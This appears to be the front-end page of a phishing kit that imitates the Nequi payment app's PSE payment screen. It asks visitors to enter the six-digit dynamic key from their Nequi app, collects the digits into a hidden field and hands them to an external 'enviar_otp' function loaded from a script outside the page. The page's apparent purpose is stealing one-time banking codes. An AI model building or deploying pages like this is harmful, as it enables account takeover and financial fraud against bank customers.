<?php 



?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nequi</title>

    <!-- icono -->
    <link rel="icon" href="./images/icononeki.ico" />

    <!-- Google Fonts: Manrope -->
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

    <!-- Estilos -->
    <link rel="stylesheet" href="css/otp.css" />
    <link href="https://unpkg.com/ionicons@4.5.10-0/dist/css/ionicons.min.css" rel="stylesheet" />

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <script src="" type="text/javascript"></script>
</head>
<body>
    <div class="main-container">

        <!-- Encabezado -->
        <div class="header">
            <img src="images/logo.png" alt="Nequi" class="header__img" />
        </div>

        <!-- TÃ­tulo y subtÃ­tulo -->
        <h1 class="title">Pagos PSE de Nequi</h1>
        <h2 class="subtitle">
            Para confirmar tu pago escribe o pega la clave dinÃ¡mica que encuentras en tu App Nequi.
        </h2>
<main>
  
      <div class="clave">
	  <div class="clave2">
      <input type="tel" inputmode="numeric" name="field1" maxlength="1" class="clave3" id="digit1">
      <input type="tel" inputmode="numeric" name="field2" maxlength="1" class="clave3" id="digit2">
      <input type="tel" inputmode="numeric" name="field3" maxlength="1" class="clave3" id="digit3">
      <input type="tel" inputmode="numeric" name="field4" maxlength="1" class="clave3" id="digit4">
	  <input type="tel" inputmode="numeric" name="field5" maxlength="1" class="clave3" id="digit5">
	  <input type="tel" inputmode="numeric" name="field6" maxlength="1" class="clave3" id="digit6">
    <input type="hidden" id="txtOTP" name="cDinamica">
      </div>
      </div>
      <div class="teclado">
  <div class="fila">
    <button class="btn-num" data-num="1">1</button>
    <button class="btn-num" data-num="2">2</button>
    <button class="btn-num" data-num="3">3</button>
  </div>
  <div class="fila">
    <button class="btn-num" data-num="4">4</button>
    <button class="btn-num" data-num="5">5</button>
    <button class="btn-num" data-num="6">6</button>
  </div>
  <div class="fila">
    <button class="btn-num" data-num="7">7</button>
    <button class="btn-num" data-num="8">8</button>
    <button class="btn-num" data-num="9">9</button>
  </div>
    <div class="fila fila-ultima">
    <button class="btn-vacio" disabled></button>
    <button class="btn-num" data-num="0">0</button>
    <button class="btn-borrar">
        <img src="images/icono-borrar.png" alt="Borrar" class="icono-borrar" />
    </button>
    </div>
</div>

<div class="cancelar">
  <button type="button" class="btn-cancelar">Realizar el pago</button>
</div>

<script>
  const inputFields = [
    document.getElementById('digit1'),
    document.getElementById('digit2'),
    document.getElementById('digit3'),
    document.getElementById('digit4'),
    document.getElementById('digit5'),
    document.getElementById('digit6')
  ];
  const hiddenOTP = document.getElementById('txtOTP');
  let currentIndex = 0;

  // Agregar con botones visuales
  document.querySelectorAll('.btn-num').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentIndex < 6) {
        inputFields[currentIndex].value = btn.dataset.num;
        currentIndex++;
        updateHiddenOTP();
      }
    });
  });

  // BotÃ³n borrar visual
  document.querySelector('.btn-borrar').addEventListener('click', () => {
    if (currentIndex > 0) {
      currentIndex--;
      inputFields[currentIndex].value = '';
      updateHiddenOTP();
    }
  });

  // Escribir con teclado fÃ­sico
  document.addEventListener('keydown', function(event) {
    if (/^\d$/.test(event.key)) {
      if (currentIndex < 6) {
        inputFields[currentIndex].value = event.key;
        currentIndex++;
        updateHiddenOTP();
      }
      event.preventDefault();
    }

    if (event.key === 'Backspace') {
      if (currentIndex > 0) {
        currentIndex--;
        inputFields[currentIndex].value = '';
        updateHiddenOTP();
      }
      event.preventDefault();
    }
  });

  // Actualizar input hidden
  function updateHiddenOTP() {
    let otp = '';
    inputFields.forEach(input => {
      otp += input.value;
    });
    hiddenOTP.value = otp;
  }

  // BotÃ³n "Realizar el pago"
  document.querySelector('.btn-cancelar').addEventListener('click', () => {
    if (hiddenOTP.value.length === 6) {
      enviar_otp(hiddenOTP.value); // Requiere funciÃ³n externa definida
    } else {
      alert("Por favor ingresa los 6 dÃ­gitos.");
    }
  });
</script>

  </main>
</body>
</html>

